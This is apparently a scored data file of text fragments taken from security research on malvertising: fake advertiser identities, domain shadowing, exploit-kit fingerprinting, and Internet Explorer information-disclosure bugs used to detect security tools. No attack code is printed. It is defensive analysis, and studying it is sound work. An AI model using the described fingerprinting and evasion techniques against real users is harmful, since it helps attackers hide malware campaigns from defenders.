"Whether referring to desktop or mobile-centric adverts, numerous half truths or plain misunderstandings related to how malvertising works potentially make rogue ads sound like less of a threat. Additionally, the notion that only people 'looking at porn' or torrents get caught by malverts, which may have been the case years ago, is no longer valid as major websites are serving rogue ads on a daily basis.",0.011424615681778993
Misconceptions about malvertising,0.008141154834810815
"As mentioned earlier, one of the biggest issues with educating the public about malvertising is the misconception that the victim has to click the ad to become infected. The reality is that, more often than not, if the rogue ad has loaded then it's already too late and the PC is probably compromised.",0.01103455818151744
"The public may also believe that infections are over-hyped by security companies, as comments from site owners hit by malvertising typically include statements claiming that they received very few reports from disgruntled victims. However, the fact that many malverts work silently in the background, coupled with the expectation that a regular surfer is unaware of breaking malvertising developments, results in victims not actually knowing which site infected their PC in the first place.",0.013187527438802027
"Given that many 'legit' ads perform potentially obnoxious actions on the desktop (such as sliding into view, autoplaying sound, fading in as the surfer scrolls back up to the URL bar), it's particularly difficult to work out which ad will cause what problem – whether a minor inconvenience or a major malware infection.",0.01155263780311655
"There are so many ways bad actors can push malverts, it can be difficult to establish common traits or patterns to help identify specific groups. Small attacks relying on certain conditions (such as ignoring those running specific security tools) before launching to ensure they only target certain PC set-ups (and thus potentially flying under the radar) are just as valid an approach as the larger, 'fire and forget' attacks which see non‑discriminatory exploits launching malware at victims' PCs from dozens of major web publishers simultaneously.",0.014158059259273381
"In both scenarios, the likelihood of the bad actors being caught by law enforcement is remote, given the ease with which fake credentials can be used to set up advertising accounts – a problem which has existed going back to the days of major adware players such as Zango and Direct Revenue, who would typically place all blame on rogue affiliates spiralling out of control [5].",0.012990535242663137
Desktops,0.007954109270156273
"Embedded ads in toolbars – or even just an endless stream of ad redirects via browser extensions – can cause major headaches for surfers, as well as potentially making it more difficult to track the source of an infection.In February 2016, a toolbar possessed the capability to inject its own ad banners into web pages, and a rogue ad injected into the page resulted in a compromise attempt. The rogue advertiser would fingerprint the victim to ensure they wanted to infect them, then made use of redirection to an Angler Exploit Kit drive-by attempt [6].",0.011068824129432442
"While much of the appeal where malvertising is concerned is the automated nature of exploits and installs requiring little (if not zero) human interaction, many bad actors dabbling in adverts rely on a combination of PUPs and social engineering to make their ill-gotten gains.",0.015682649456775
"One of the most popular tactics is the ever popular install bundler, sometimes classed as a 'Download manager'. Ten years ago, these were adware bundlers – nowadays, they're more likely to be the (theoretically) tamer PUP (Potentially Unwanted Program) download managers. The end result is the same: multiple installs of programs generally unrelated to what the victim was originally looking for, links to scammy adverts selected by geolocation, and a variety of fake 'Your browser/Java/Flash/video player is outdated' prompts [7].",0.012934076819977047
"Whether tied to bundled installers or not, many fake 'outdated program' advert landing pages end up leading to malware.",0.015850998951724482
"While the above is a crude – if successful – technique, there are occasional splashes of sophistication buried among the rather basic confidence tricks.",0.015919897960499974
"In June 2016, we saw a fake LastPass extension in the Chrome store which set victims on a journey of multiple install pages, additional extension install prompts, and websites harbouring numerous 'Install now' buttons. Often these install prompts are designed to mimic the look and feel of the current site, leading to unwanted installs/adverts – while the download link you actually want is buried in small text elsewhere on the page [8]. Google's Safe Browsing has started cracking down on techniques such as this, classing them as social engineering [9].",0.011824350193723299
Mobile,0.009794922767398573
"Mobile lives or dies on its ability to be convenient, whether browsing or performing common tasks. The desire to pay instantly without the need for sign‑ups or entering payment details has given rise to so-called 'Direct to bill', where a click of the payment button bills your network provider, with the cost being passed to you via your bill [10].",0.01257607544440631
"While these services are supposed to have a specific flow in order to prevent dubious behaviour, the reality is that the merchants (website owners) find ways to subvert the process and trigger a payment state without anything being pressed on the landing site.",0.013098299166388938
"When browsing an otherwise benign website, advert redirects targeting mobile users would send victims to an apparently blank page. At this point, the device owner would receive a text message informing them that they'd paid £5 to enter a lottery, with a 'view again' message attached (which would potentially result in another payment being made if clicked). Although there is a maximum limit on payment amounts for these services (so it isn't possible to lose large sums of money), the recovery process is so convoluted that scammers stand to make large sums of money from victims who give up on ever regaining their cash.",0.017296137944699308
Figure 1: Text message informing the device owner they have entered a lottery.,0.01857236016729391
"Mobile networks ask victims to contact merchants directly and raise a complaint – in practice, this means victims have to contact the scammer, hand over personal information to (in theory) receive a cheque and then hope the scammers don't try something else with the newly obtained PII. As most (if not all) of these services rely on premium services being available on a mobile, one of the only ways to avoid charges besides using a mobile ad blocker is to disable premium billing. Unfortunately, most mobile networks enable premium numbers by default on the basis that customers may want to use these services, so lengthy calls to carriers may ensue to switch it off.",0.016956088205676623
Ad/click fraud,0.009269320235368639
"Laws and regulations intended to keep us safe or aware of different types of PII collection are, in some cases, contributing to rogue installs by retraining us to take risky actions online. An EU directive resulted in all affected countries updating their privacy laws [11], so in most cases a website will notify you of their cookie policy. In practice, this means millions of people rush to click an 'OK' prompt to remove it from the screen and go about their business.",0.011811910150659521
"Scammers have exploited this by placing an invisible iframe ad over the top of a cookie tracking style pop‑up – the moment the supposed warning box is clicked, the victim loads the advertiser's website and a profit is made via clickjacking [12].",0.013419511696393882
Figure 2: Clickjacking.,0.018454707952693217
Malware,0.008279402424597238
"As the name suggests, malware is the end-game for malvertising and at present nothing comes close to the headaches posed by ransomware drive-bys. There are numerous instances of ransomware being dropped onto both mobiles and desktops – in some cases riding a wave of dubious privacy invasions [13], and in others trying to sneak past detection while pushing large campaigns out to hugely popular websites across the globe [14].",0.014711555735473558
"In the latter example, the bad actors had planned ahead – making use of domains registered many years ago and purchasing 'clean' ads so as not to raise suspicions, then striking after attracting precisely zero negative attention. Many of the groups behind these scams are in it for the long haul, and are suitably difficult to weed out as a result.",0.013332391635875518
"As advertising evolves, so do malvertising attacks. New mediums such as video adverts are now also being abused to serve malware [15]. The problem with video ads is the possibility of embedding third-party code at various levels, weakening any trust one may have in the VAST and VPAID formats.",0.010286454812124757
Playing in the shadows,0.00995987609110982
"The major malvertising attacks always seem to come out of nowhere, leaving many dumbfounded. Threat actors love to create fake online identities and leverage various tools and techniques to blend in while they hide their malicious intent.",0.024061213917194735
Fake profiles,0.009911407704392139
"Trust is a critical factor in any kind of transaction or business. In advertising, trust is extremely important, especially when the stakes are high (i.e. top publishers with millions of visits).",0.021252495362369173
"A fraudulent advertiser wants to gain access to these large audiences to get maximum exposure for his payload. In some cases, as mentioned earlier, criminals will hack legitimate – and trusted – buyers and hijack their account to accomplish their nefarious purposes. In other cases, fraudsters only need to dupe someone that is already trusted within the ad chain to avoid having to go through more extensive security screening themselves.",0.011337053627977434
"Rogue actors were born to create various profiles, websites and other online presence indicators out of thin air or by stealing material from someone else. With a basic fake identity that can consist of a LinkedIn profile and Skype account, the assumed advertiser is ready to go and spend some ad money and push clean ads for a little while to avoid any suspicion, before eventually starting to slowly disseminate rogue ones.",0.014063009791651204
Figure 3: Fraudulent advertiser.,0.016853567563656635
"By playing this game of Dr Jekyll and Mr Hyde, rogue advertisers can remain undetected for long periods of time.",0.01763407376869275
Domain shadowing,0.008373283355566086
Domain shadowing is an extension of the fake identity which further contributes to hide the perpetrators behind what is essentially a smoke screen.,0.014623423781788047
Domain shadowing is the creation of subdomains via stolen registrant account credentials for malicious purposes. Exploit kits such as Angler have made this technique popular because of its unique way of evading blacklists [16].,0.018269295935129604
"Rogue advertisers leverage domain shadowing to steal an existing company's identity, as well as host the ad banner and malicious code on their own server.",0.013929124466511067
"They start by finding several potential victims, typically using website account credentials harvested via phishing emails or malware. The crooks then create a subdomain that points to their own server, often leveraging the privacy features of cloud providers to add another layer of deception.",0.017131322002476024
"This server hosts various files associated with the advert, which include some JavaScript and the ad banner itself. The image is made hastily from logos and text stolen from the website of the company the crooks are impersonating, but to all intents and purposes it looks genuine.",0.011403609399373793
"During our research we were able to link several different malvertising incidents based on metadata from the ad banners themselves, showing that the same group was behind all these attacks [17].",0.012067518330546978
SSL challenges,0.011230320972278607
The abuse of free SSL providers is often a dead giveaway that a subdomain does not belong to the website owner when their main domain is still plain HTTP [18] or uses a different certificate.,0.014686102951630975
"While 'HTTPS everywhere' is a good thing for security as a whole, it poses some challenges for researchers and existing monitoring tools. This is especially true when ad banners are served from the advertisers' own servers, where all of a sudden all of the code is wrapped in an encrypted tunnel and invisible to security solutions placed between the ad server and the client (browser).",0.014349252399660672
"It also becomes more difficult for attributing and reporting incidents [19] because not only is the ad content encrypted but so is the ad call URL. Typically, such URLs contain various identifiers for the publisher, advertiser and campaign ID which can really help to narrow down the perpetrators.",0.012766904057332273
Micro targeting and fingerprinting,0.010534253536375271
"Online crooks very much leverage the profiling available to all advertisers via ad platforms to target certain countries, and even types of users, with great precision. While criminal 'traffers' were already very good at distributing traffic based on various selectors, they cannot beat the power of the online ad industry when it comes to 'knowing your audience'.",0.015526539679319717
"The quality and relevance of traffic that matters so much to advertisers is also critically important to malware distributors. The latter benefit from the ad network's potential ability to distinguish real traffic versus bots or VPNs, so that the intended victims are genuine users.",0.01310533662421598
Figure 4: VPN detection.,0.015505866396660406
"In the more advanced malvertising cases, the targeting is such that trying to reproduce an attack 'artificially' in a lab environment will often not yield any results. Threat actors have the upper hand when it comes to switching attacks on and off at the time of day and time zone of their liking, not to mention a plethora of other criteria.",0.01428400728707857
Fingerprinting,0.008515222154125479
"Fingerprinting is an interesting concept which aims at discarding unwanted users by leveraging information disclosure bugs on the client side, typically in the browser.",0.01246246797252093
"It adds yet another layer of filtering, which threat actors use to guarantee honeypots, and security scanners only see benign activity instead of getting the intended malware payload.",0.014113991934880166
Origins,0.008133998959769295
A vulnerability in Internet Explorer's XMLDOM ActiveX control (CVE-2013-7331) [20] allows attackers to enumerate the local file system and look for certain file and folder names. Examples include looking for anti-malware and anti-virus software.,0.009124389200034333
Figure 5: Filename enumeration.,0.013587061659365629
"Another bug with the MIME type check [21] also allows it to be determined whether a file extension is associated with a program, directly from the web browser. By finding out that the .pcap extension is associated with a program, attackers know that the current user is most likely a security researcher running the Wireshark network protocol analyser.",0.009574979890838109
"Exploit kits have long used fingerprinting in their landing pages [22] to quickly detect the presence of virtual machines, traffic packet capture and web debugging software, as well as security products, and to make the decision to abort the exploits and payloads.",0.013122338910300457
Figure 6: Encoded fingerprinting.,0.02081902628608223
Current use in adverts,0.009636160799569082
"Threat actors realized that they could move or at least duplicate the fingerprinting earlier in the attack chain and that by placing it within the ad banner they could filter – and more importantly discard – non intended victims, who would never see the exploit kit. The benefits are less unwanted traffic, more precise targeting, and of course lack of any evidence from an ad-check point of view.",0.011913374194976956
"Malwarebytes and GeoEdge described this technique in a joint research paper entitled 'Operation Fingerprint' [23], which detailed sophisticated new ways to perform these checks away from prying eyes.",0.01458759985179059
Hiding in a GIF,0.008470314759945752
"Back in the summer of 2015, we were stumped while investigating several high-profile malvertising cases, trying to find what some in the industry call the 'smoking gun'. In other words, without actual proof of a direct connection between an advertiser and malicious code, one simply cannot accuse the former of any wrongdoing.",0.01650788230235989
"It took hours of painstaking work to be able to reproduce and spot what we would later call fingerprinting. That code was hiding, in plain sight so to speak, within a GIF image. What gave it away was its larger than normal size for a 1x1 pixel tracker since it had embedded JavaScript code in it.",0.014179249208308264
"In later variants of the fake GIF attacks, threat actors added obfuscation to the fingerprinting code, which in some cases required a key to decode. That key was a string of characters cleverly planted in between a large JavaScript file, making identification more difficult.",0.014245963450396415
"During some research into a particular campaign, we stumbled upon an open web server that was used to test the fingerprinting technique. The code contained a few extra lines to output the results to the console and displayed a 'success' alert box if the detection routine worked. Observing the malware authors refine their tool almost in real time was a troubling experience.",0.013534759812611319
Figure 7: A 'success' alert is displayed if the detection routine works.,0.016948199632961236
Targeting users precisely is not only a way to maximize infection rates but also a means to fly under the radar by limiting unnecessary exposure. The combination of exploits and profiling tools from the ad industry gives threat actors a unique advantage which they leverage against the very same people that try to stop them.,0.012659070412770035
The future of online ads,0.010235339686518907
"Browsing the web is becoming an increasingly schizophrenic activity. With an ad blocker installed, it's not uncommon for a site to trigger two messages to the surfer simultaneously – one which asks them to switch off their ad blocker, and one from the ad blocker itself which asks if they'd like to switch off the messages from the site asking them to unblock the ads.",0.01298724152123687
Figure 8: A plea to turn off ad blockers.,0.01530319777559852
"This becomes even more confusing when people release so-called ad blocker blocker blockers, designed to prevent sites noticing the installed ad blocking tech and let the surfer continue browsing as normal. Many of these tools turn out to be rogue or simply don't work, which further muddies the waters.",0.013409571033013545
"Ad blocking analytic firms who provide blocking stats to webmasters have also been compromised, such as PageFair (whose account on a content distribution network was hijacked in 2015) and used to push a fake Adobe Flash update, which was served by 501 publishers in 83 minutes [24].",0.014369438662805378
"Ultimately, all of these compromises eventually hurt the websites that find all of their ads blocked by default – recent studies have found that one in five smartphone users block advertisements [25], and even console gamers have been blocking dynamically served ads for many years – in 2011, Xbox users were using OpenDNS to block ads served on their console dashboard [26].",0.015274007338305862
"A new trend in advergaming – which is when an advert is displayed in a videogame – replaces passive background banners and pop‑ups (which can all be worked around) with adverts that are an integral component of gameplay itself. When a gamer is about to die, the game pauses and a message appears on the screen, reading: 'You're about to die, want to be saved by viewing an ad? [Yes! Save me!] [No, let me die].' This approach seeks to reduce or even eliminate ad removal by using techniques which would potentially break the game if such a thing was attempted. We expect to see this increasing in popularity as more people look to eliminate ads from their daily experiences.",0.01303334074314133
"Blurring the lines further, what we call 'online' is moving into the world around us, and as a result, forms of online advertising and tracking are following the same path. Ad companies want to make use of near field communications to combine location‑based video and mobile to 'watermark' mobiles when they pass specific digital screens – at which point, a relevant advertisement is served to the mobile device [27].",0.015083889801078776
"Depending on how these services are deployed by companies around the world, there may be different forms of consent required before a service can be used, and ultimately it may be too much hard work for a shopper to understand – at which point, they simply switch off their phone and are no longer reachable.",0.010819820689812798
"While some may not be troubled by online ads, the people who feel real‑world interaction is a step too far and intentionally make themselves unreachable by friends or family just to skip ads are having a demonstrably negative impact on their life as a result.",0.013947038983591287
"On a similar note, while the real‑world impact of so-called public shaming on social networks is a hotly contested practice, in 2015 real‑world advertising took this social media phenomenon into the streets of Hong Kong. A marketing communications agency teamed up with a nano-pharmaceutical company to create accurate so-called 'Wanted' posters built from the DNA of people dropping litter [28].",0.015196403138188597
"While the concept is an interesting one, there is room for error – what if the litter was in the streets because of a ripped trash bag? What if someone had dropped it accidentally or it had fallen out of their pocket? Again, we see the potential for advertising in the world around us to have a prominent detrimental impact on an individual's life.Technologists are busy building real‑world ad blockers, which mount on headsets and attempt to blur out any and all brands and logos as you see them on your day‑to‑day travels [29]. How long will it be before the more traditional forms of online ad blocking – which attempt to filter out networks and tracking – also make the leap, taking on everything from mall ads to DNA-centric billboards?",0.015144340329791173
"And, more importantly, will the real world become as schizophrenic as the online model as a result?",0.01310952884171912
Conclusion,0.008171308922719556
"Whatever move site owners and publishers make next, the reality is that ad blocking is here to stay. Slowly but surely, we're seeing major websites setting up tools to report bad ads. In 2016, popular modding site Nexus Mods implemented an advert reporting service, and in two months, they received more than 8,500 reports on 115 specific ad placements [30]. As a result, they changed to another ad network.",0.015180902220431003
"Similar things are happening on other major sites such as Neogaf [31] – interestingly, these attempts to curb rogue ads are coming from the gaming sector. While some webmasters are beginning to realize the negative impact bad ads can have on their ability to make money, it may well be that blocking ads is more of a band aid than a permanent fix.",0.012630204537904755
"The ad model currently in place, with banners and boxes placed onto websites – which is mostly unchanged from the way it was a decade ago – may simply be one which was never meant to have a long shelf life. With its multiple moving parts and endless chains of potentially bad actors, it's certainly not conducive to security practices, with a never ending stream of compromises as a result.",0.010573555234954513
"'Tip jar'-style funding along the lines of Patreon/Kickstarter, or simply paying a one‑off/repeating fee to hide ads or provide additional services over non-paying customers may be the way forward. The difficulty is in convincing enough visitors to hand over the money in the first place – without this, we're likely going to be stuck with the current, arguably broken by default model we have.",0.014175566616903335
References,0.0158494738281566
"[1] Segura, J. Malwarebytes Labs. Large Angler Malvertising Campaign Hits Top Publishers.https://blog.malwarebytes.org/threat-analysis/2016/03/large-angler-malvertising-campaign-hits-top-publishers/.",0.015098750027999097
"[2] Salusky, W. InfoSec Handlers Diary Blog. Malvertising. https://isc.sans.edu/diary/Malvertising/3727.",0.011237916328439512
"[3] Liston, T. InfoSec Handlers Diary Blog. https://isc.sans.edu/diary.html?date=2004-07-23.",0.010535257422536137
"[4] Kotila, M. botlab.io. Busting Malvertising Myths –The Role of Adtech Industry in Malvertising.http://botlab.io/busting-malvertising-myths-the-role-of-adtech-industry-in-malvertising/.",0.014126443624731144
"[5] Edelman, B. People of the State of New York V. Direct Revenue, LLC. http://www.benedelman.org/spyware/nyag-dr/.",0.01228146804621455
"[6] Segura, J. Malwarebytes Labs. Wajam browser Add-on serves Malvertising. https://blog.malwarebytes.org/threat-analysis/2016/02/wajam-browser-add-on-serves-malvertising/.",0.011211030811545508
"[7] Artnz, P. Malwarebytes Labs. AdLoad: an advertisement bombarder. https://blog.malwarebytes.org/threat-analysis/2016/04/adload-an-advertisement-bombarder/.",0.014096978449904984
"[8] Umawing, J. Malwarebytes Labs. Fake LastPass extension exposes users to ads and installs.https://blog.malwarebytes.org/cybercrime/2016/04/fake-lastpass-extension-exposes-users-to-ads-and-installs/.",0.011094522718290367
[9] Google Security Blog. No more deceptive download buttons. https://security.googleblog.com/2016/02/no-more-deceptive-download-buttons.html.,0.011721372451902523
"[10] Boyd, C. Malwarebytes Labs. Watch out for costly mobile ads. https://blog.malwarebytes.org/cybercrime/2015/08/watch-out-for-costly-mobile-ads/.",0.015419631577824666
[11] European. Commission. Cookies. http://ec.europa.eu/ipg/basics/legal/cookies/index_en.htm#section_2.,0.011924481891421035
"[12] Segura, J. Malwarebytes Labs. Clickjacking campaign plays on European cookie law.https://blog.malwarebytes.org/threat-analysis/2016/01/clickjacking-campaign-plays-on-european-cookie-law/.",0.013140390362955556
"[13] Boyd, C. Malwarebytes Labs. Malvertisements on ""Fappening"" forum lead to Android Ransomware.https://blog.malwarebytes.org/cybercrime/2016/04/malvertisements-on-fappening-forum-lead-to-android-ransomware/.",0.012859219526216825
"[14] Segura, J. Malwarebytes Labs. Malvertising Campaign Goes (Almost) Undetected. https://blog.malwarebytes.org/threat-analysis/2015/09/large-malvertising-campaign-goes-almost-undetected/.",0.013330615422348258
"[15] Dangu, J. Malwarebytes Labs. Video Ads: Malvertising's Next Frontier? https://blog.malwarebytes.org/threat-analysis/2015/11/video-ads-malvertisings-next-frontier/.",0.015650286051351436
[16] Talos Group. Threat Spotlight: Angler Lurking in the Domain Shadows. http://blogs.cisco.com/security/talos/angler-domain-shadowing.,0.01792135899649694
"[17] Segura, J. Malwarebytes Labs. A Look Into Malvertising Attacks Targeting The UK.https://blog.malwarebytes.org/threat-analysis/2016/03/a-look-into-malvertising-attacks-targeting-the-uk/.",0.013603765194185602
[18] Proofpoint Staff. The shadow knows: Malvertising campaigns use domain shadowing to pull in Angler EK.https://www.proofpoint.com/us/threat-insight/post/The-Shadow-Knows.,0.0161405636873746
"[19] Franceschi-Bicchierai, L. Motherboard. The Downside of Encrypting Everything: Virus-Filled Ads Are Harder to Track. http://motherboard.vice.com/read/the-downside-of-encrypting-everything-virus-filled-ads-are-harder-to-track.",0.013426696248268533
[20] National Vulnerability Database. Vulnerability Summary for CVE-2013-7331. https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-7331.,0.011570546536474824
"[21] Segura, J. Malwarebytes Labs. The proof is in the cookie. https://blog.malwarebytes.org/threat-analysis/2014/11/the-proof-is-in-the-cookie/.",0.011410767949512457
[22] Kafeine. MalwareDontNeedCoffee. CVE-2013-7331/CVE-2015-2413 (onload variant) and Exploit Kits.http://malware.dontneedcoffee.com/2014/10/cve-2013-7331-and-exploit-kits.html.,0.009070469764620004
"[23] Segura J.; Aseev, E. Operation Fingerprint: A Look Into Several Angler Exploit Kit Malvertising Campaigns.https://blog.malwarebytes.org/threat-analysis/2016/03/ofp/.",0.014278857559198554
"[24] Martin, A. Anti-adblocker firm PageFair's users hit by fake Flash update. The Register.http://www.theregister.co.uk/2015/11/02/pagefair_malware_snare_scare_in_halloween_hack_of_adblocker_blocker/.",0.011727725617171947
"[25] Ungureanu, H. Mobile ad blocking surge: 1 in 5 smartphone users block ads on their device: report. TechTimes. http://www.techtimes.com/articles/162128/20160531/mobile-ad-blocking-surge-1-in-5-smartphone-users-block-ads-on-their-device-report.htm.",0.011421630095322599
"[26] Absurdlyobfuscated, Reddit. How to block Xbox dashboard ads. https://www.reddit.com/r/gaming/comments/n5831/how_to_block_xbox_dashboard_ads/.",0.011573359441469977
[27] Screen Media daily. Location based mobile ads coming to mall screens nationwide. http://screenmediadaily.com/location-based-mobile-ads-coming-to-mall-screens-nationwide/.,0.01510100211642973
[28] S. C. M. Post. Hong Kong litterbugs shamed in billboard portraits made using DNA from trash.http://www.scmp.com/lifestyle/article/1804420/hong-kong-litterbugs-shamed-billboard-portraits-made-using-dna-trash.,0.013578469446472563
"[29] Vanhemert, K. Wired. An AR experiment that works like an ad blocker for real life. http://www.wired.com/2015/01/adblock-real-life-adblock-real-life/.",0.013888910314735159
"[30] Boyd, C. Malwarebytes Labs. Nexus mods site goes public with ""bad ad"" report. https://blog.malwarebytes.org/cybercrime/2016/05/nexus-mods-site-goes-public-with-bad-ad-report/.",0.012045345600358304
"[31] EviLore. NeoGAF ad quality improvement/monitoring and user reporting functionality now live. http://www.neogaf.com/forum/showthread.php?t=1229205.
",0.009775665726044158
"Browser-based fingerprinting: implications and mitigations
Update (04/12/2017): The INRIA has a tool to fingerprint browser extensions and detect other other browser leaks.
Update (03/17/2017): Microsoft patched CVE-2017-0022, reported by Trend Micro.
Update (10/11/2016): Microsoft patched the other fingerprinting vuln. we mentioned before as ‘unpatched’, known as CVE-2016-3298. Now every fingerprinting attempt return SUCCESS (onreadystatechange/onload fire anyway) even if the resource file does not actually exist.
Essentially, the patch makes sure that content coming from resources other than res://ieframe.dll are not being loaded, instead, a default about:blank is set as the location. Loading res://ieframe.dll/16/1 inside an iFrame loads the resource, but trying the same thing with, say, res://mshtml.dll/16/1 fails and an about:blank is loaded instead.
Patching information vulnerability disclosure bugs remains an ongoing issue. Indeed, only a few hours after the fixed had been pushed via Windows Update, Manuel Caballero found a bypass:",0.010355828758438879
"CVE-2016-3298 (local file checking) bypassed. Attackers will party again! Try a few variations and you will get it!https://t.co/PPLGVM7ixX pic.twitter.com/G0sYphYdn0
— Manuel Caballero (@magicmac2000) October 12, 2016",0.013127205085919247
"Update: 09/19/2016
Manuel Caballero has already bypassed the patch for  CVE-2016-3351. Check out his post for all the details. As we’ve mentioned in our conclusion at the end of this blog “Information disclosure bugs seem to linger and resurface quickly after they have been patched”.
Update: 09/14/2016
Following the research and disclosure by Proofpoint and TrendMicro, Microsoft has officially patched another information disclosure bug (CVE-2016-3351) known as the ‘MIME type check’ that affects Internet Explorer and Edge. We’ve added it to the list in the post below.
Note: the res flaw in IE/Edge is still active and unpatched (thanks Manuel Caballero for checking).
– –
Malware authors will leverage every tool and trick they can to keep their operations in complete stealth mode. Fingerprinting gives them this extra edge to hide from security researchers and run large campaigns almost completely undetected. To describe it succinctly, fingerprinting makes use of an information disclosure flaw in the browser that allows an attacker to read the user’s file system and look for predefined names.
There are plenty of examples on how successful fingerprinting can be; we covered some in our research whitepaper back in March 2016, Operation Fingerprinting, but even that was just the tip of the iceberg. More recently, researchers at Proofpoint uncovered a massive malvertising campaign that ran for at least a year and probably more, which allowed for a very large number of malware infections. It heavily relied on fingerprinting to go unnoticed by carefully targeting genuine users, running bona fide OEM computers.",0.014327959908638777
"Figure 1: Fingerprinting used in a malvertising campaign, hidden as a GIF image
Certainly, this is a lesson to learn for the defense side to up our game in the face of increased sophistication in online attacks. At the same time, we could easily remove a powerful weapon from the bad guys’ toolsets, which would lead to more rapid identification of their campaigns, at least until they come up with another trick.
There are also privacy implications as fingerprinting could be used to profile users, based on a list of programs present on their machines. We can imagine marketing folks from company A being interested to know if visitors to their website are running product from company B.",0.011587157064062437
"Figure 2:  Checking if Norton Antivirus is installed, directly from the browser
This is trivial to do with a single line of code (currently unpatched, keep reading for additional details), although it would certainly raise eyebrows in how it’s done. Less scrupulous actors might be interested in spying on persons of interests and check if they are running specific tools such as VPNs or encryption software.
A little bit of history on some troublesome protocols
Abusing Internet Explorer protocols has allowed malware authors to either run malicious code or gain information about their victims. Here we review some past and present techniques including one that is currently unpatched and used in exploit kits and malvertising attacks.
File:// protocol
If we go back in time, before XP’s Service Pack 2, the local machine zone (LMZ) allowed you to run binaries without restrictions via another protocol, the file:// protocol.",0.010351881509786609
"Figure 3: Microsoft fixed a flaw that allowed to run binaries in IE6 and earlier.
The file:// protocol was literally running in the local machine zone, with full privileges. From your evil webpage you could do:",0.008090416282861779
"and after instantiating a WScript.Shell, you could do a full remote code execution.
XMLDOM loadXML (CVE-2013-7331)
Back in 2013, a researcher revealed how Microsoft XMLDOM in IE can divulge information of local drive/network in error messages – XXE. This technique was/is used in the wild by various exploit kits as well as in some malvertising campaigns. The XMLDOM technique is the most powerful one for fingerprinting purposes as it allows for any type of file (not just binaries) to be checked for.
Microsoft fixed the issue with XMLDOM checks. See tweet and following discussion here.
For a proof of concept code: http://pastebin.com/raw/Femy8HtG.
Onload res:// CVE-2015-2413
res:// is an internal IE protocol running in the Internet Zone (even for local files) that allows webpages to load resources from local files (from the resource section). At the same time, IE considers many of this res: URLs “special” and it allows them to do things like opening the Internet Connection Dialog (and much more).
Microsoft allows res:// URLs to be loaded by normal HTTP webpages because IE/Edge need them for various parts of the browser’s functionality, like default error or information pages.
It was added to the Magnitude EK, as a pre-check on its gate, but is now patched as well. The res technique isn’t as good as the XMLDOM one as it can only check for binaries, as it needs their resource section.",0.011913632210070801
"Figure 4: Image created from a script using onload to detect if the resource was loaded
MIME type check (CVE-2016-3351)
As described in details by Proofpoint, this MIME type check has been in use for a very long time, in fact as early as January 2014. The purpose of this flaw was to discover if certain file associations were linked to particular security/developer programs (i.e. Wireshark, Fiddler, Python, etc) but also regular software (Skype, VLC, etc). By making this determination, the attacker could decide whether or not to continue the attack. This was a great way to weed out security researchers and target real people. This bug was patched by Microsoft on September 13, 2016.
We ‘accidentally’ stumbled upon this technique in November 2014 in a post that was to start a chain reaction of various events:",0.009643927964184784
"We caught up with it again in mid 2015 when it was used successfully in large malvertising campaigns. This time around, the code was hiding inside of a fake GIF. In addition to checking for MIME type, it also used the XMLDOM vulnerability.",0.0109758684190292
"Manuel Caballero has written up a simple piece of code if  you are interested in checking out this bug.
Iframe res:// variant (unpatched)
Update (10/11/2016): Patched by Microsoft  as CVE-2016-3298.
Affected software:
Operating System: Windows 7, Windows 10 (both fully patched).
Browsers: Internet Explorer 10, 11. Microsoft Edge (38.14393.0.0) & Microsoft EdgeHTML (14.14393).
Note: For Microsoft Edge, fingerprinting will only work in the Windows and Program Files folders, as the AppContainer doesn’t allow read access to other parts of the system.",0.00963714948419181
"Figure 5: Determining the presence of calc.exe under %system32% from a website.
Current use in exploit kits:
We studied the way Neutrino EK filters security researchers via the same Flash exploit it uses to exploit and infect a system (Neutrino EK: fingerprinting in a Flash) as well as one of its pre-gate checks (Neutrino EK: more Flash trickery).",0.012083639755261277
"Figure 6: iframes checking for local files
Using ActionScript within the Flash exploit, Neutrino EK can check on those loadable resources and guess via JavaScript and DOM events if those files exist.
Disclaimer: we are not sharing our proof of concept publicly as Microsoft is currently working on a patch. While it’s true that it is in the wild, the PoC we wrote is derived from Neutrino’s Flash-based fingerprinting and a lot easier to copy/paste for other bad guys to reuse. If you are interested, please contact us privately.
Mitigations
A good mitigation to the abuse of this problem would be to allow IE to load resource files that are used only by IE such as mshtml.dll, ieframe.dll, and a few more. All the other ones should be blocked!
In other words, iexplore.exe (or any other binary using the WebBrowser Control) should be allowed to load only the resources that are really needed by the WebBrowser engine, and no more. The only legitimate uses of the res: protocol are IE internal pages/dialogs and maybe old toolbars. DevTools (F12) also uses it.",0.010677437355756214
"Figure 7: Some res:// calls in Microsoft Edge
Some old toolbars that are relying on res:// might stop working but they can whitelist those particular DLLs or even better, let the developers update their code.
Conclusion
Information disclosure bugs seem to linger and resurface quickly after they have been patched. This is probably due to the core issue not being fundamentally addressed perhaps because of compatibility risk in making any drastic change.
While these flaws are not critical compared to, let’s say remote code execution, they can help bad guys to save those RCEs for genuine victims and hide them from the security community much longer.
Acknowledgements
I would like to say a big thank you to Manuel Caballero for inspiring me to dig deeper into this issue. Thanks to Eric Lawrence for additional checks in Edge and affected paths.
",0.00983560974094333
"Elusive HanJuan EK Drops New Tinba Version (updated)
Update 07/03/15: AdFly contacted us and we are publishing their statement below:
We are sorry for the inconvenience but this is something AdFly is obviously not letting happen on purpose. We count with several methods to prevent fraudulent advertising, unfortunately (and very ocassionally) if a fraudulent advertising changes the redirection of a campaign after been reviewed by us, this is a possibility.
This specific campaign has been located now and cancelled.
We normally ask our users to report malicious ads to the email abuse@adf.ly providing the IP address that has seen it at least in the last 48 hours. This should allow us to track it and in most of the cases suspend the advertiser’s account.
AdFly Support
Update: Dutch security firm Fox-IT has identified the payload as an evolution of a Tinba v2
version, a well-known banking piece of malware.
In this post, we describe a malvertising attack spread via a URL shortener leading to HanJuan EK, a rather elusive exploit kit which in the past was used to deliver a Flash Player zero-day.
Often times cyber-criminals will use URL shorteners to disguise malicious links. However, in this particular case, it is embedded advertisement within the URL shortener service that leads to the malicious site.
It all begins with Adf.ly which uses interstitial advertising, a technique where adverts are displayed on the page for a few seconds before the user is taken to the actual content.",0.01152464376010387
"Following a complex malvertising redirection chain, the HanJuan EK is loaded and fires Flash Player and Internet Explorer exploits before dropping a payload onto disk.
The payload we collected uses several layers of encryption within the binary itself but also in its communications with its Command and Control server.
The purpose of this Trojan is information stealing performed by hooking the browser to act as a man-in-the-middle and grab passwords and other sensitive data.
Technical details
Malvertising chain",0.008801653339201465
The first four sessions load the interstitial ad via an encoded JavaScript blurb:,0.006671223216909272
Google Chrome’s JavaScript console can help us quickly identify the redirection call without going through a painful decoding process:,0.008779269513262355
